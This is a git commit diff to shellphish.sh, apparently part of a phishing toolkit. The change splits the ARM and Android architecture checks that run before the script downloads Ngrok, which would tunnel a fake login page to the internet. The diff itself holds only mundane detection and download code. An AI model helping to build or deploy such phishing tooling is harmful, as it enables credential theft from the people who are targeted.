54fde7694212e8d32f49d8e3856edfec1668242f
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2018-06-26 02:09:42 -0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -313,9 +313,9 @@ echo ""
 else
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm\|Android' | head -n1)
-
-if [[ $arch == *'arm'* ]] || [[ $arch == *'Android'* ]] ; then
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
